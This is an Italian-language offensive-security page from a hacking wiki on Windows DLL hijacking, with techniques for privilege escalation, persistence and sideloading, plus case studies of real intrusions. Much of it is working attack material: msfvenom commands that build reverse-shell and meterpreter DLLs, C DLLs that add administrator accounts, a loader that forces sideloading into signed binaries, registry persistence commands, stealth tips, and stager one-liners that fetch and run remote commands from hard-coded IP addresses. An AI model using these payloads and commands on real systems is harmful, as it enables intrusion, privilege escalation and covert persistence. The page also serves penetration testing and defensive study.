# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking consiste nel manipolare un'applicazione affidabile affinché carichi una DLL dannosa. Questo termine comprende diverse tattiche come **DLL Spoofing, Injection, and Side-Loading**. Viene utilizzato principalmente per code execution, ottenere persistence e, meno comunemente, privilege escalation. Nonostante qui l'attenzione sia su privilege escalation, il metodo di hijacking rimane coerente a prescindere dall'obiettivo.

### Tecniche comuni

Diversi metodi vengono impiegati per il DLL hijacking, ciascuno con la sua efficacia a seconda della strategia di caricamento delle DLL dell'applicazione:

1. **DLL Replacement**: Sostituire una DLL genuina con una DLL dannosa, opzionalmente utilizzando DLL Proxying per preservare la funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: Posizionare la DLL dannosa in un percorso di ricerca che viene esaminato prima di quello legittimo, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: Creare una DLL dannosa che un'applicazione caricherà, pensando sia una DLL richiesta ma inesistente.
4. **DLL Redirection**: Modificare parametri di ricerca come `%PATH%` o i file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione alla DLL dannosa.
5. **WinSxS DLL Replacement**: Sostituire la DLL legittima con una controparte dannosa nella directory WinSxS, metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: Collocare la DLL dannosa in una directory controllata dall'utente insieme all'applicazione copiata, assimilabile alle tecniche di Binary Proxy Execution.

> [!TIP]
> For a step-by-step chain that layers HTML staging, AES-CTR configs, and .NET implants on top of DLL sideloading, review the workflow below.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Trovare Dll mancanti

Il modo più comune per trovare Dll mancanti all'interno di un sistema è eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals, **impostando** i **seguenti 2 filtri**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

e mostrare solamente la **File System Activity**:

![](<../../../images/image (153).png>)

Se stai cercando **missing dlls in general** lasciare questo in esecuzione per alcuni **secondi**.\
Se stai cercando una **missing dll inside an specific executable** dovresti impostare **un altro filtro come "Process Name" "contains" `<exec name>`, eseguirlo, e fermare la cattura degli eventi**.

## Sfruttare Dll mancanti

Per poter escalate privileges, la nostra migliore opportunità è riuscire a **scrivere una dll che un processo privilegiato tenterà di caricare** in uno dei **luoghi in cui verrà cercata**. Di conseguenza, potremo **scrivere** una dll in una **cartella** dove la **dll viene cercata prima** della cartella che contiene la **dll originale** (caso anomalo), oppure potremo **scrivere in una cartella dove la dll verrà cercata** e la dll **originale non esiste** in nessuna cartella.

### Dll Search Order

Nella [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) puoi trovare come le Dll vengono caricate nello specifico.

Le Windows applications cercano le DLL seguendo un insieme di **pre-defined search paths**, rispettando una sequenza particolare. Il problema del DLL Hijacking si verifica quando una DLL dannosa è posizionata in una di queste directory in modo strategico, garantendo che venga caricata prima della DLL autentica. Una soluzione per prevenire ciò è assicurarsi che l'applicazione utilizzi percorsi assoluti quando fa riferimento alle DLL di cui ha bisogno.

Puoi vedere l'**DLL search order on 32-bit** sistemi di seguito:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Questo è l'ordine di ricerca di default con **SafeDllSearchMode** abilitato. Quando è disabilitato, la directory corrente scala al secondo posto. Per disabilitare questa funzione, crea il valore di registro HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode e impostalo a 0 (di default è abilitato).

Se la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) viene chiamata con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, nota che una dll potrebbe essere caricata indicando il percorso assoluto invece del solo nome. In quel caso quella dll verrà cercata solo in quel percorso (se la dll ha dipendenze, queste verranno cercate come normali DLL caricate per nome).

Esistono altri modi per alterare l'ordine di ricerca ma non li spiegherò qui.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

An advanced way to deterministically influence the DLL search path of a newly created process is to set the DllPath field in RTL_USER_PROCESS_PARAMETERS when creating the process with ntdll’s native APIs. By supplying an attacker-controlled directory here, a target process that resolves an imported DLL by name (no absolute path and not using the safe loading flags) can be forced to load a malicious DLL from that directory.

Idea chiave
- Costruire i parametri del processo con RtlCreateProcessParametersEx e fornire un DllPath personalizzato che punti alla cartella controllata (es. la directory dove risiede il vostro dropper/unpacker).
- Creare il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL per nome, il loader consulterà il DllPath fornito durante la risoluzione, permettendo uno sideloading affidabile anche quando la DLL dannosa non è colocata con l'EXE target.

Note/limitazioni
- Ciò influenza il processo figlio che viene creato; è diverso da SetDllDirectory, che influenza solo il processo corrente.
- Il target deve importare o fare LoadLibrary di una DLL per nome (nessun percorso assoluto e non usando LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e percorsi assoluti hardcoded non possono essere hijackati. Forwarded exports e SxS possono cambiare la precedenza.

Esempio minimo in C (ntdll, wide strings, gestione semplificata degli errori):

<details>
<summary>Full C example: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio d'uso operativo
- Place a malicious xmllite.dll (exporting the required functions or proxying to the real one) in your DllPath directory.
- Launch a signed binary known to look up xmllite.dll by name using the above technique. The loader resolves the import via the supplied DllPath and sideloads your DLL.

Questa tecnica è stata osservata in-the-wild per guidare catene di sideloading multi-stage: un initial launcher rilascia una helper DLL, che poi genera un Microsoft-signed, hijackable binary con un DllPath custom per forzare il caricamento della DLL dell’attaccante da una staging directory.


#### Exceptions on dll search order from Windows docs

Alcune eccezioni all'ordine di ricerca standard delle DLL sono riportate nella documentazione di Windows:

- Quando viene incontrata una **DLL che condivide il suo nome con una già caricata in memoria**, il sistema salta la ricerca abituale. Invece, esegue un controllo per redirection e un manifest prima di defaultare sulla DLL già in memoria. **In questo scenario, il sistema non esegue una ricerca per la DLL**.
- Nei casi in cui la DLL sia riconosciuta come una **known DLL** per la versione di Windows in uso, il sistema utilizzerà la sua versione della known DLL, insieme a qualsiasi sua DLL dipendente, **omettendo il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene la lista di queste known DLLs.
- Se una **DLL ha dipendenze**, la ricerca per queste DLL dipendenti viene condotta come se fossero indicate solo dai loro **module names**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.

### Escalation dei privilegi

**Requirements**:

- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.

Sì, i requisiti sono complicati da trovare perché **di default è strano trovare un eseguibile privilegiato mancante di una dll** ed è ancora **più strano avere permessi di scrittura in una cartella del system path** (di solito non ci puoi). Però, in ambienti malconfigurati questo è possibile.\
Nel caso in cui sei fortunato e soddisfi i requisiti, puoi controllare il progetto [UACME](https://github.com/hfiref0x/UACME). Anche se lo **scopo principale del progetto è bypass UAC**, potresti trovare lì una **PoC** di una Dll hijaking per la versione di Windows che puoi usare (probabilmente cambiando semplicemente il percorso della cartella dove hai permessi di scrittura).

Nota che puoi **verificare i tuoi permessi in una cartella** eseguendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche verificare gli imports di un executable e gli exports di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abusare Dll Hijacking per elevare i privilegi** con permessi di scrittura in una **System Path folder** consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatizzati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificherà se hai permessi di scrittura su qualsiasi cartella all'interno del system PATH.\
Altri strumenti automatizzati interessanti per scoprire questa vulnerabilità sono le **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll_.

### Esempio

Se trovi uno scenario sfruttabile, una delle cose più importanti per sfruttarlo con successo è **creare una dll che esporti almeno tutte le funzioni che l'eseguibile importerà da essa**. Nota inoltre che Dll Hijacking è utile per [escalare da Medium Integrity level a High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Puoi trovare un esempio di **come creare una dll valida** in questo studio sul dll hijacking focalizzato sul dll hijacking per l'esecuzione: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Inoltre, nella **sezione successiva** puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **modelli** o per creare una **dll con funzioni non richieste esportate**.

## **Creazione e compilazione Dlls**

### **Dll Proxifying**

In pratica un **Dll proxy** è una Dll in grado di **eseguire il tuo codice malevolo quando viene caricata** ma anche di **esporsi** e **funzionare** come **previsto**, inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente indicare un eseguibile e selezionare la libreria che vuoi proxify e generare una dll proxified, oppure indicare la Dll e generare una dll proxified.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86, non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Personalizzato

Nota che in diversi casi la Dll che compili deve **esportare diverse funzioni** che verranno caricate dal processo vittima; se queste funzioni non esistono il **binary non sarà in grado di caricarle** e l'**exploit** fallirà.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di DLL C++ con creazione utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa con punto di ingresso per thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Caso di studio: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a cercare, all'avvio, una DLL di localizzazione prevedibile e specifica per lingua che può essere hijacked per esecuzione di codice arbitrario e persistenza.

Punti chiave
- Percorso di ricerca (build correnti): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build meno recenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se una DLL scrivibile controllata dall'attaccante esiste nel percorso OneCore, viene caricata e `DllMain(DLL_PROCESS_ATTACH)` viene eseguita. Non sono richieste esportazioni.

Individuazione con Procmon
- Filtro: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Avviare Narrator e osservare il tentativo di caricamento del percorso sopra indicato.

DLL minima
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- Un hijack ingenuo attiverà/evidenzierà l'UI. Per restare silenziosi, al momento dell'attach enumera i thread di Narrator, apri il thread principale (`OpenThread(THREAD_SUSPEND_RESUME)`) e `SuspendThread` su di esso; continua nel tuo thread. Vedi PoC per il codice completo.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Con quanto sopra, avviando Narrator viene caricata la DLL piantata. Sul desktop sicuro (schermata di accesso), premi CTRL+WIN+ENTER per avviare Narrator; la tua DLL viene eseguita come SYSTEM sul desktop sicuro.

RDP-triggered SYSTEM execution (lateral movement)
- Allow classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Esegui RDP verso l'host; sulla schermata di accesso premi CTRL+WIN+ENTER per lanciare Narrator; la tua DLL viene eseguita come SYSTEM sul desktop sicuro.
- L'esecuzione si interrompe quando la sessione RDP si chiude — inietta/migra prontamente.

Bring Your Own Accessibility (BYOA)
- Puoi clonare una voce di registro di un Accessibility Tool (AT) integrato (es. CursorIndicator), modificarla per puntare a un binary/DLL arbitrario, importarla, quindi impostare `configuration` su quel nome AT. Questo permette l'esecuzione arbitraria tramite il framework Accessibility.

Notes
- Scrivere sotto `%windir%\System32` e modificare valori HKLM richiede diritti admin.
- Tutta la logica del payload può vivere in `DLL_PROCESS_ATTACH`; non sono necessari exports.

## Caso di studio: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Questo caso dimostra **Phantom DLL Hijacking** nel TrackPoint Quick Menu di Lenovo (`TPQMAssistant.exe`), tracciato come **CVE-2025-1729**.

### Dettagli della vulnerabilità

- **Componente**: `TPQMAssistant.exe` situato in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` esegue quotidianamente alle 9:30 nel contesto dell'utente connesso.
- **Directory Permissions**: Scrivibile da `CREATOR OWNER`, permettendo agli utenti locali di posare file arbitrari.
- **DLL Search Behavior**: Tenta di caricare `hostfxr.dll` dalla sua working directory per prima e registra "NAME NOT FOUND" se mancante, indicando la precedenza della ricerca nella directory locale.

### Implementazione dell'exploit

Un attaccante può posizionare uno stub malevolo `hostfxr.dll` nella stessa directory, sfruttando la DLL mancante per ottenere esecuzione di codice nel contesto dell'utente:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Flusso d'attacco

1. Come utente standard, posizionare `hostfxr.dll` in `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Attendere che l'attività pianificata venga eseguita alle 9:30 AM nel contesto dell'utente corrente.
3. Se un amministratore è loggato quando l'attività viene eseguita, la DLL malevola viene eseguita nella sessione dell'amministratore con integrità medium.
4. Eseguire tecniche standard di UAC bypass per elevare dall'integrità medium ai privilegi SYSTEM.

## Caso di studio: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Gli attori di minaccia spesso abbinano droppers basati su MSI con DLL side-loading per eseguire payload sotto un processo firmato e affidabile.

Panoramica della catena
- L'utente scarica il MSI. Una CustomAction viene eseguita silenziosamente durante l'installazione GUI (es. LaunchApplication o un'azione VBScript), ricostruendo la fase successiva da risorse incorporate.
- Il dropper scrive un EXE legittimo e firmato e una DLL malevola nella stessa directory (esempio: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Quando l'EXE firmato viene avviato, l'ordine di ricerca DLL di Windows carica prima wsc.dll dalla directory di lavoro, eseguendo il codice dell'attaccante sotto un processo padre firmato (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Cerca voci che eseguono eseguibili o VBScript. Esempio di pattern sospetto: LaunchApplication che esegue un file incorporato in background.
- In Orca (Microsoft Orca.exe), ispezionare le tabelle CustomAction, InstallExecuteSequence e Binary.
- Payload incorporati/suddivisi nel CAB dell'MSI:
- Estrarre come amministratore: msiexec /a package.msi /qb TARGETDIR=C:\out
- Oppure usare lessmsi: lessmsi x package.msi C:\out
- Cercare più piccoli frammenti che vengono concatenati e decifrati da una CustomAction VBScript. Flusso comune:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Sideloading pratico con wsc_proxy.exe
- Posiziona questi due file nella stessa cartella:
- wsc_proxy.exe: host legittimo firmato (Avast). Il processo tenta di caricare wsc.dll per nome dalla sua directory.
- wsc.dll: DLL dell'attaccante. Se non sono richieste esportazioni specifiche, DllMain può essere sufficiente; altrimenti, crea una proxy DLL e inoltra le esportazioni richieste alla libreria genuina eseguendo il payload in DllMain.
- Costruisci un payload DLL minimo:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Per i requisiti di export, usa un framework di proxying (es., DLLirant/Spartacus) per generare una forwarding DLL che esegua anche il tuo payload.

- Questa tecnica si basa sulla risoluzione del nome DLL da parte del binary host. Se l'host usa percorsi assoluti o flag di caricamento sicuro (es., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), l'hijack può fallire.
- KnownDLLs, SxS e forwarded exports possono influenzare la precedenza e devono essere considerati nella selezione del binary host e dell'insieme di export.

## Triadi firmate + payload crittografati (case study ShadowPad)

Check Point ha descritto come Ink Dragon distribuisce ShadowPad usando una **triade composta da tre file** per mimetizzarsi con software legittimo mantenendo il payload principale crittografato su disco:

1. **Signed host EXE** – vendor come AMD, Realtek o NVIDIA vengono abusati (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Gli attaccanti rinominano l'eseguibile per farlo sembrare un binario Windows (per esempio `conhost.exe`), ma la firma Authenticode rimane valida.
2. **Malicious loader DLL** – lasciata accanto all'EXE con il nome atteso (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). La DLL è di solito un binario MFC offuscato con il framework ScatterBrain; il suo unico compito è localizzare il blob crittografato, decrittarlo e mappare riflessivamente ShadowPad.
3. **Encrypted payload blob** – spesso memorizzato come `<name>.tmp` nella stessa directory. Dopo aver mappato in memoria il payload decrittato, il loader cancella il file TMP per eliminare le evidenze forensi.

Note di tradecraft:

* Rinominare l'EXE firmato (mentre si conserva l'`OriginalFileName` originale nell'header PE) gli permette di mascherarsi come un binario Windows pur mantenendo la firma del vendor, quindi replicare l'abitudine di Ink Dragon di piazzare binari che sembrano `conhost.exe` ma sono in realtà utility AMD/NVIDIA.
* Poiché l'eseguibile resta fidato, la maggior parte dei controlli di allowlisting richiede solo che la tua DLL malevola stia accanto a esso. Concentrati sul customizzare la loader DLL; il parent firmato può tipicamente essere eseguito senza modifiche.
* Il decryptor di ShadowPad si aspetta che il blob TMP risieda accanto al loader e sia scrivibile così da poter azzerare il file dopo il mapping. Mantieni la directory scrivibile fino a quando il payload non viene caricato in memoria; una volta in memoria il file TMP può essere eliminato in tutta sicurezza per OPSEC.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Gli operatori abbinano DLL sideloading con LOLBAS in modo che l'unico artefatto custom su disco sia la DLL malevola accanto al trusted EXE:

- **Remote command loader (Finger):** un PowerShell nascosto avvia `cmd.exe /c`, preleva comandi da un server Finger e li passa a `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` preleva testo via TCP/79; `| cmd` esegue la risposta del server, permettendo agli operatori di ruotare il second stage lato server.

- **Built-in download/extract:** Scarica un archivio con un'estensione innocua, estrailo e prepara il target di sideload più la DLL in una cartella casuale sotto `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` nasconde il progresso e segue i redirect; `tar -xf` usa il tar integrato di Windows.

- **WMI/CIM launch:** Avvia l'EXE via WMI in modo che la telemetria mostri un processo creato da CIM mentre carica la DLL collocata nello stesso percorso:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Funziona con binari che preferiscono DLL locali (es., `intelbq.exe`, `nearby_share.exe`); il payload (es., Remcos) viene eseguito sotto il nome trusted.

- **Hunting:** Segnala `forfiles` quando `/p`, `/m` e `/c` appaiono insieme; è raro fuori da script amministrativi.


## Caso di studio: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Una recente intrusione Lotus Blossom ha abusato di una catena di update trusted per consegnare un dropper impacchettato con NSIS che ha messo in scena un DLL sideload oltre a payload eseguiti interamente in memoria.

Flusso operativo
- `update.exe` (NSIS) crea `%AppData%\Bluetooth`, lo marca **HIDDEN**, deposita un Bitdefender Submission Wizard rinominato `BluetoothService.exe`, una `log.dll` malevola e un blob crittografato `BluetoothService`, poi lancia l'EXE.
- L'host EXE importa `log.dll` e chiama `LogInit`/`LogWrite`. `LogInit` mappa in memoria il blob; `LogWrite` lo decritta con uno stream custom basato su LCG (costanti **0x19660D** / **0x3C6EF35F**, materiale della chiave derivato da un hash precedente), sovrascrive il buffer con shellcode in chiaro, libera temporanei e salta a esso.
- Per evitare una IAT, il loader risolve le API hashandone i nomi degli export usando **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, poi applicando una avalanche in stile Murmur (**0x85EBCA6B**) e confrontando contro hash target salati.

Shellcode principale (Chrysalis)
- Decripta un modulo principale simile a un PE ripetendo add/XOR/sub con la chiave `gQ2JR&9;` su cinque passaggi, poi carica dinamicamente `Kernel32.dll` → `GetProcAddress` per completare la risoluzione delle import.
- Ricostruisce le stringhe dei nomi DLL a runtime tramite trasformazioni per carattere bit-rotate/XOR, poi carica `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Usa un secondo resolver che percorre il **PEB → InMemoryOrderModuleList**, analizza ogni export table in blocchi da 4 byte con mixing in stile Murmur, e ricorre a `GetProcAddress` solo se l'hash non viene trovato.

Configurazione embedded & C2
- La config risiede all'interno del file droppato `BluetoothService` a **offset 0x30808** (dimensione **0x980**) ed è decrittata con RC4 con chiave `qwhvb^435h&*7`, rivelando l'URL C2 e lo User-Agent.
- I beacon costruiscono un profilo host delimitato da punti, antepongono il tag `4Q`, poi criptano con RC4 con chiave `vAuig34%^325hGV` prima di `HttpSendRequestA` su HTTPS. Le risposte vengono decrittate con RC4 e gestite da uno switch di tag (`4T` shell, `4V` exec di un processo, `4W/4X` scrittura file, `4Y` read/exfil, `4\\` uninstall, `4` enumerazione di drive/file + casi di trasferimento chunked).
- La modalità di esecuzione è regolata dagli argomenti CLI: nessun argomento = installa persistenza (service/Run key) puntando a `-i`; `-i` rilancia se stesso con `-k`; `-k` salta l'install e esegue il payload.

Loader alternativo osservato
- La stessa intrusione ha droppato Tiny C Compiler ed eseguito `svchost.exe -nostdlib -run conf.c` da `C:\ProgramData\USOShared\`, con `libtcc.dll` accanto. Il sorgente C fornito dall'attaccante incorporava shellcode, veniva compilato ed eseguito in memoria senza toccare il disco con un PE. Per replicare:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Questa TCC-based compile-and-run stage ha importato `Wininet.dll` a runtime e ha scaricato un second-stage shellcode da un URL hardcoded, fornendo un loader flessibile che si maschera da compiler run.

## Riferimenti

